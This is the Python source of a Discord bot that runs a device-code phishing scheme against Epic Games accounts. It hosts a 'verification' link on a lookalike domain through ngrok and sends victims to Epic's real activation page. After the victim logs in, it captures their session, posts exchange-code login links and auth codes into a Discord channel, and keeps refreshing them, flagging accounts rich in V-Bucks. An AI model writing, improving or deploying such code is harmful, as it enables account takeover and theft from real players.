#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Discord Bot for Epic Games Authentication - Reverted to your specifications. Fast and Accurate.
- Last Updated: 2025-11-20 06:20:00
"""
# --- SETUP AND INSTALLATION ---
import os
import sys
import subprocess
import requests
import zipfile
import stat
import platform
import time

def run_setup():
    """Ensures all dependencies and ngrok are installed before starting."""
    # This setup is confirmed to be working and remains unchanged.
    print("--- Starting initial setup ---")
    try:
        import discord
        print("1/3: discord.py is already installed.")
    except ImportError:
        print("1/3: discord.py not found. Installing..."); _install_package("discord.py")
    ngrok_path = os.path.join(os.getcwd(), "ngrok")
    if not os.path.exists(ngrok_path):
        print("2/3: Downloading and installing ngrok...")
        try:
            machine, system = platform.machine().lower(), platform.system().lower()
            ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
            if system == "linux" and ("aarch64" in machine or "arm64" in machine): ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
            elif system == "darwin": ngrok_url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-{'arm64' if 'arm' in machine else 'amd64'}.zip"
            elif system == "windows": ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
            with requests.get(ngrok_url, stream=True) as r:
                r.raise_for_status()
                with open("ngrok.zip", "wb") as f:
                    for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
            with zipfile.ZipFile("ngrok.zip", "r") as zip_ref: zip_ref.extractall(".")
            os.remove("ngrok.zip")
            if system != "windows": os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
            print("     ngrok installed successfully.")
        except Exception as e: print(f"     ERROR: Failed to download ngrok: {e}", file=sys.stderr); sys.exit(1)
    else: print("2/3: ngrok is already installed.")
    authtoken = os.getenv("NGROK_AUTHTOKEN")
    if authtoken:
        try:
            print("3/3: Configuring ngrok authtoken...")
            subprocess.check_call([ngrok_path, "config", "add-authtoken", authtoken], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("     ngrok authtoken configured.")
        except Exception as e: print(f"     WARNING: Failed to configure ngrok: {e}", file=sys.stderr)
    else: print("3/3: NGROK_AUTHTOKEN not set; required for custom domains.")
    print("--- Setup complete ---")

def _install_package(package):
    try: subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except Exception as e: print(f"     ERROR: Failed to install {package}: {e}", file=sys.stderr); sys.exit(1)

run_setup()

# --- MAIN APPLICATION IMPORTS ---
import logging, asyncio, threading, http.server, socketserver, uuid, traceback, aiohttp, discord
from discord.ext import commands

# ==============================================================================
# --- CONFIGURATION AND GLOBALS ---
# ==============================================================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("rift_checker_bot")

DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
CUSTOM_DOMAIN = "help.id-epicgames.com"
REFRESH_INTERVAL = 180 

# REVERTED: Removed the iOS token as requested. Only the Switch token is used now.
EPIC_API_SWITCH_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"

ngrok_ready = threading.Event()
permanent_link, PERMANENT_LINK_ID = None, str(uuid.uuid4())[:13]
TARGET_CHANNEL_ID, verification_uses = None, 0
active_sessions, session_lock = {}, threading.Lock()

intents = discord.Intents.default(); intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents); bot.remove_command('help')

# ==============================================================================
# --- EPIC AUTHENTICATION LOGIC ---
# ==============================================================================
async def create_epic_auth_session():
    """Creates a new device authentication session."""
    headers = {"Authorization": f"basic {EPIC_API_SWITCH_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
    async with aiohttp.ClientSession() as sess:
        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data={"grant_type": "client_credentials"}) as r:
            r.raise_for_status(); token_data = await r.json()
        device_auth_headers = {"Authorization": f"bearer {token_data['access_token']}", "Content-Type": "application/x-www-form-urlencoded"}
        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers=device_auth_headers) as r:
            r.raise_for_status(); dev_auth = await r.json()
    return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code']}

async def get_exchange_code(access_token):
    try:
        async with aiohttp.ClientSession() as sess, sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"}) as r:
            if r.status == 200: return (await r.json())['code']
    except Exception: return None

async def get_authorization_code(access_token):
    try:
        async with aiohttp.ClientSession() as sess, sess.get("https://www.epicgames.com/id/api/redirect", headers={"Authorization": f"bearer {access_token}"}, allow_redirects=False) as r:
            if r.status == 200: return (await r.json()).get("authorizationCode")
    except Exception: return None

async def get_vbucks_balance(access_token, account_id):
    """V-BUCKS FIX: Uses a reliable endpoint to get the correct balance."""
    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
    url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core"
    try:
        async with aiohttp.ClientSession() as sess, sess.post(url, headers=headers, json={}) as r:
            if r.status != 200: return 0
            profile_data = await r.json()
            for item in profile_data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {}).values():
                if 'Currency:Mtx' in item.get('templateId', ''): return item.get('quantity', 0)
    except Exception: return 0
    return 0

def monitor_epic_auth_sync(device_code, channel_id, user_ip):
    """Starts the fast login monitor."""
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try: loop.run_until_complete(wait_for_device_code_completion(device_code, channel_id, user_ip))
    finally: loop.close()

async def wait_for_device_code_completion(device_code, channel_id, user_ip):
    """SPEED FIX: This function provides the fast login response."""
    headers = {"Authorization": f"basic {EPIC_API_SWITCH_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"grant_type": "device_code", "device_code": device_code}
    async with aiohttp.ClientSession() as sess:
        while True:
            async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data=data) as r:
                token_data = await r.json()
                if r.status == 200 and "access_token" in token_data: break
                if token_data.get("errorCode") != "errors.com.epicgames.account.oauth.authorization_pending":
                    logger.error(f"Login failed: {token_data.get('errorMessage', 'Unknown error')}"); return
            await asyncio.sleep(5)
    
    logger.info("✅ User logged in!")
    access_token, account_id = token_data['access_token'], token_data['account_id']
    displayName = token_data['displayName']
    exchange = await get_exchange_code(access_token)
    vbucks = await get_vbucks_balance(access_token, account_id)
    auth_code = await get_authorization_code(access_token) if vbucks > 5000 else None
    
    session_id = str(uuid.uuid4())[:8]
    info = {'id': account_id, 'displayName': displayName, 'email': 'N/A'}
    with session_lock:
        active_sessions[session_id] = {'access_token': access_token, 'account_info': info, 'user_ip': user_ip, 'created_at': time.time(), 'refresh_count': 0, 'expires_at': time.time() + 10800, 'status': 'active', 'message_id': None, 'channel_id': channel_id, 'vbucks': vbucks}
    
    bot.loop.create_task(send_new_login_message(session_id, exchange, auth_code))
    # REVERTED: Start an individual refresh task per session, as originally designed.
    bot.loop.create_task(individual_session_refresher(session_id))

async def individual_session_refresher(session_id):
    """REVERTED: This is the original, per-session refresh logic."""
    try:
        with session_lock: session = active_sessions[session_id]; is_high_value = session.get('vbucks', 0) > 5000
        logger.info(f"[{session_id}] 🔄 Starting refresh task for {session['account_info']['displayName']}.")
        while time.time() < session['expires_at']:
            await asyncio.sleep(REFRESH_INTERVAL)
            with session_lock:
                if session['status'] == 'expired': break
                access_token = session['access_token']
            new_code = await get_exchange_code(access_token)
            new_auth = await get_authorization_code(access_token) if is_high_value else None
            if new_code:
                session['refresh_count'] += 1
                await edit_bot_message(session_id, new_exchange_code=new_code, new_auth_code=new_auth)
    except Exception: pass
    finally:
        with session_lock:
            if session_id in active_sessions and active_sessions[session_id]['status'] != 'expired':
                active_sessions[session_id]['status'] = 'expired'
                await edit_bot_message(session_id, status='expired')

# ==============================================================================
# --- DISCORD BOT LOGIC ---
# ==============================================================================
async def send_new_login_message(session_id, initial_exchange_code, initial_auth_code):
    with session_lock: session = active_sessions[session_id]
    if not (channel := bot.get_channel(session['channel_id'])): return
    embed = build_embed(session_id, initial_exchange_code, initial_auth_code)
    try: message = await channel.send(embed=embed); session['message_id'] = message.id
    except Exception as e: logger.error(f"Failed to send message: {e}")

async def edit_bot_message(session_id, new_exchange_code=None, new_auth_code=None, status=None):
    with session_lock: session = active_sessions[session_id]
    if not session.get('message_id') or not (channel := bot.get_channel(session['channel_id'])): return
    try: message = await channel.fetch_message(session['message_id']); await message.edit(embed=build_embed(session_id, new_exchange_code, new_auth_code, status_override=status))
    except Exception: pass

def build_embed(session_id, exchange_code=None, auth_code=None, status_override=None):
    with session_lock: session = active_sessions[session_id]
    status, vbucks = status_override or session['status'], session.get('vbucks', 0)
    name = session['account_info'].get('displayName', 'N/A')
    if status == 'active': title, color, desc = f"✅ Logged In: {name}", 0x57F287, f"**{name}** verified!\n\n🔄 *Refreshing for 3 hours.*"
    elif status == 'expired': title, color, desc = f"🔚 Expired: {name}", 0x737373, f"3-hour window for **{name}** has ended."
    else: title, color, desc = f"🔄 Refreshed: {name}", 0x3498DB, f"New codes for **{name}**!"
    if vbucks > 5000: title = f"💎 {title}"
    embed = discord.Embed(title=title, description=desc, color=color, timestamp=datetime.now(datetime.timezone.utc))
    embed.add_field(name="Name", value=name, inline=True).add_field(name="ID", value=f"`{session['account_info'].get('id', 'N/A')}`", inline=False)
    embed.add_field(name="<:vbucks:1234567890> V-Bucks", value=f"**{vbucks:,}**", inline=False)
    if exchange_code:
        embed.add_field(name="🔗 Login Link", value=f"**[Click to login](https://www.epicgames.com/id/exchange?exchangeCode={exchange_code})**", inline=False)
        embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)
    if auth_code: embed.add_field(name="🔐 Auth Code", value=f"```{auth_code}```", inline=False)
    embed.set_footer(text=f"Refreshes: {session['refresh_count']}" if status != 'expired' else f"Completed with {session['refresh_count']} refreshes.")
    return embed

async def setup_target_channel(guild):
    global TARGET_CHANNEL_ID
    if TARGET_CHANNEL_ID and bot.get_channel(TARGET_CHANNEL_ID): return
    target_channel = discord.utils.get(guild.text_channels, name="rift-auth")
    if not target_channel:
        try: target_channel = await guild.create_text_channel("rift-auth")
        except discord.Forbidden: target_channel = guild.text_channels[0]
    TARGET_CHANNEL_ID = target_channel.id
    logger.info(f"✅ Target channel locked to: #{target_channel.name} in {guild.name}")
    await target_channel.send(embed=discord.Embed(title="🚀 Rift Bot Activated", description=f"**Verification Link:**\n`{permanent_link}`", color=0x7289DA))

@bot.event
async def on_guild_join(guild): await setup_target_channel(guild)

@bot.event
async def on_ready():
    global permanent_link
    permanent_link = f"https://{CUSTOM_DOMAIN}/verify/{PERMANENT_LINK_ID}"
    logger.info(f"✅ Bot is online as {bot.user}")
    bot.loop.create_task(run_web_server_async())
    await bot.wait_until_ready()
    if not bot.guilds: logger.warning("Bot is not in any servers."); return
    await setup_target_channel(bot.guilds[0])

# ==============================================================================
# --- WEB SERVER AND NGROK ---
# ==============================================================================
class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global verification_uses
        path_parts = self.path.strip("/").split("/")
        if len(path_parts) == 2 and path_parts[0] == 'verify' and path_parts[1] == PERMANENT_LINK_ID:
            if not TARGET_CHANNEL_ID:
                self.send_response(503); self.send_header('Content-type', 'text/html'); self.end_headers()
                self.wfile.write(b"<h1>Bot is not ready. Please try again in a moment.</h1>"); return
            verification_uses += 1; client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            try:
                loop = asyncio.new_event_loop(); epic_session = loop.run_until_complete(create_epic_auth_session()); loop.close()
                threading.Thread(target=monitor_epic_auth_sync, args=(epic_session['device_code'], TARGET_CHANNEL_ID, client_ip), daemon=True).start()
                self.send_response(302); self.send_header('Location', epic_session['activation_url']); self.end_headers()
            except Exception as e: logger.error(f"Auth session error: {e}"); self.send_error(500)
        else: self.send_error(404); self.end_headers()
    def log_message(self, format, *args): pass

def run_web_server():
    with socketserver.ThreadingTCPServer(("", 8000), RequestHandler) as httpd:
        logger.info("🚀 Web server starting on port 8000"); httpd.serve_forever()

def setup_ngrok_tunnel():
    ngrok_executable = os.path.join(os.getcwd(), "ngrok.exe" if platform.system() == "windows" else "ngrok")
    if not os.getenv("NGROK_AUTHTOKEN"): logger.warning("NGROK_AUTHTOKEN not found! Custom domain will fail.")
    logger.info(f"🌐 Starting ngrok for {CUSTOM_DOMAIN}...")
    command = [ngrok_executable, 'http', '8000', f'--domain={CUSTOM_DOMAIN}']
    try:
        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(5); logger.info(f"✅ ngrok should be live at https://{CUSTOM_DOMAIN}"); ngrok_ready.set()
    except Exception as e: logger.critical(f"❌ Failed to start ngrok: {e}"); sys.exit(1)

async def run_web_server_async():
    await bot.loop.run_in_executor(None, run_web_server)
    await bot.loop.run_in_executor(None, setup_ngrok_tunnel)

if __name__ == "__main__":
    try: bot.run(DISCORD_BOT_TOKEN)
    except Exception as e: logger.critical(f"❌ Bot failed to run: {e}")
